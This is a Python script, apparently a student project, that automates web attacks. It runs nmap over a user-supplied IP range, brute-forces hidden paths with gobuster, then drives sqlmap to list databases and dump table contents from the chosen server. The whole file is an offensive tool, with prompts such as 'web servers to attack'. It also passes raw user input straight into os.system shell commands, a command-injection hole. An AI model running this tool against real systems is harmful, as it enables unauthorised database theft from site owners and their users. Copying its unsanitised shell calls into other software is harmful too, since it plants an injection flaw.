#!/usr/bin/env python

'''
The purpose of our tool is to automate web application reconnaissance and SQL Injection.
This tool will test if any hidden paths of the web application is vulnerable to SQL injection.
 Our proposed tool would
 1) ping the desired network range for live hosts,
 2) scan for ports 80, 443 for web servers,
 3) use Dirbuster to show any hidden files and directories,
 4) try to perform SQLMap on those hidden web pages if they contain forms or any kind of user input.'''

import os

if os.geteuid() != 0:
    print("\nYou must run this script as a root user.\n")

    # should delete following reponse/if statement later
    response = input("Continue anyway for script testing purposes? y/n ")
    if response != "y":
        exit(0)

def nmap_scan():
    ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")
    cmd = "nmap -n --open " + ip_addr + " -p80,443"
    try:
        os.system(cmd)
        #we should probably parse nmap output to see if there were zero hosts that were found
        #if no hosts were found, give the option to run nmap scan again.

    except KeyboardInterrupt:
        print ("nmap scan failed. Run script again.")
    
    #ask user to input a website from the nmap command output. Maybe do a check to ensure that whatever they put was output from the nmap command?
    webserver = input("\nNow, let's look for hidden paths in the webserver that could be exploitable!\nType in the webserver you would like to attack: ")
    return webserver

def gobuster(webserver):
    #OS MKDIR TO INCLUDE OUR FOLDER FOR THIS APPLICATION
    cmd = "gobuster -o gobust.txt -u " + webserver + " -w /usr/share/wordlists/dirb/common.txt"
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("Gobuster failed. Run script again")

def inject_options_output():
    options = ["Exploit vulnerable input parameters", "Exploit form-based SQL Injection"]
    print("\nWhich option would you like to use in SQLMap?\n")
    counter = 1
    for option in options:
        print(counter, option, "\n")
        counter += 1
    print("\nPlease type the corresponding type number: ")

def sqlmap(webserver):
    injection_options = ["?id=1", "NOT available"]
    hidden_path = input("What hidden path would you like to SQL inject? ")
    inject_options_output()
    option_chosen = int(input())
    base_cmd = "sqlmap -u " + "\"" + webserver + hidden_path + "/" + injection_options[option_chosen - 1] + "\""
    cmd = base_cmd + " --dbs"
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("SQLMap failed. Run script again")
    return base_cmd

def database_search(base_cmd):
    database = input("Let's look inside the databases. We will start by displaying its tables. \nChoose a database to assess: ")
    cmd = base_cmd + " -D " + database +  " --tables"
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("SQLMap - search for database failed. Run script again")
    return database

def table_dump(base_cmd, database):
    table = input("Let's look inside the tables. Choose a table to display its contents: ")
    cmd = base_cmd + " --dump -D " + database +  " -T " + table
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("SQLMap - search for database table failed. Run script again")

def intro():
    ascii_title =  "____   __   __       ___   __  \n/ ___) /  \ (  )     / __) /  \ \n\___ \(  O )/ (_/\  ( (_ \(  O )\n(____/ \__\)\____/   \___/ \__/      \n\n"
    print(ascii_title)
    response = input("Type 'info' for information, anything else to continue to application: ") 
    return response

def info():
    print("This tool:\n1) pings the desired network range for live hosts,\n2) scans for ports 80, 443 for web servers,\n3) uses Gobuster to show any hidden files and directories,\n4) tries to perform SQLMap on those hidden web pages if they contain forms or any kind of user input.")
    response = input("Type 'c' to continue to application, anything else to quit: ")
    if response == "c":
        execute_sqlgo()
    else:
        exit(0)

def execute_sqlgo():
    webserver = nmap_scan() # should we clean up nmap output? put output in a seperate file? Give a warning to user when zero hosts are found?
    gobuster(webserver)
    base_cmd = sqlmap(webserver)
    database = database_search(base_cmd)
    table_dump(base_cmd, database)

if __name__ == "__main__":
    response = intro()
    if response == "info":
        info()
    else:
        execute_sqlgo()


